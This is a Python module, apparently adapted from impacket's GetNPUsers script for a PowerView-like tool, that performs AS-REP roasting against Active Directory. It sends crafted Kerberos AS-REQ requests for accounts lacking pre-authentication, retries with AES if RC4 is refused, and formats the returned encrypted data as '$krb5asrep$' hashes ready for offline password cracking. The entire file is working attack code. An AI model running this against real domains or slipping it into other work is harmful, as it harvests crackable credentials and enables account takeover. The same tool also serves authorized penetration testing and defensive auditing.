# https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/GetNPUsers.py
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from impacket.krb5 import constants
from impacket.krb5.types import KerberosTime, Principal
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError

import logging
import datetime
import random
from binascii import hexlify

class ASREProast:
    def __init__(self, powerview):
        self.powerview = powerview
        self.__requestTGT = self.powerview.use_kerberos
        self.__domain = self.powerview.domain
        self.__kdcIP = self.powerview.dc_ip

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def getTGT(self, userName, requestPAC=True):

        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        asReq = AS_REQ()

        domain = self.__domain.upper()
        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = requestPAC
        encodedPacRequest = encoder.encode(pacRequest)

        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        asReq['padata'] = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][0]['padata-value'] = encodedPacRequest

        reqBody = seq_set(asReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody['kdc-options'] = constants.encodeFlags(opts)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        seq_set(reqBody, 'cname', clientName.components_to_asn1)

        if domain == '':
            raise Exception('Empty Domain not allowed in Kerberos')

        reqBody['realm'] = domain

        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['rtime'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

        seq_set_iter(reqBody, 'etype', supportedCiphers)

        message = encoder.encode(asReq)

        try:
            r = sendReceive(message, domain, self.__kdcIP)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                # RC4 not available, OK, let's ask for newer types
                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                seq_set_iter(reqBody, 'etype', supportedCiphers)
                message = encoder.encode(asReq)
                r = sendReceive(message, domain, self.__kdcIP)
            elif self.powerview.args.stack_trace:
                raise e
            else:
                logging.error('[ASREProast] %s' % str(e))
                return

        # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
        # 'Do not require Kerberos preauthentication' set
        try:
            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
        except:
            # Most of the times we shouldn't be here, is this a TGT?
            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
        else:
            # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
            raise Exception('[ASREProast] User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)

        # Check what type of encryption is used for the enc-part data
        # This will inform how the hash output needs to be formatted
        if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
            return '$krb5asrep$%d$%s$%s$%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
                                                    hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode(),
                                                    hexlify(asRep['enc-part']['cipher'].asOctets()[:-12]).decode())
        else:
            return '$krb5asrep$%d$%s@%s:%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
                                                    hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                                    hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())

    def request(self, username):
        try:
            return self.getTGT(username)
        except Exception as e:
            raise Exception('[ASREProast] %s' % str(e))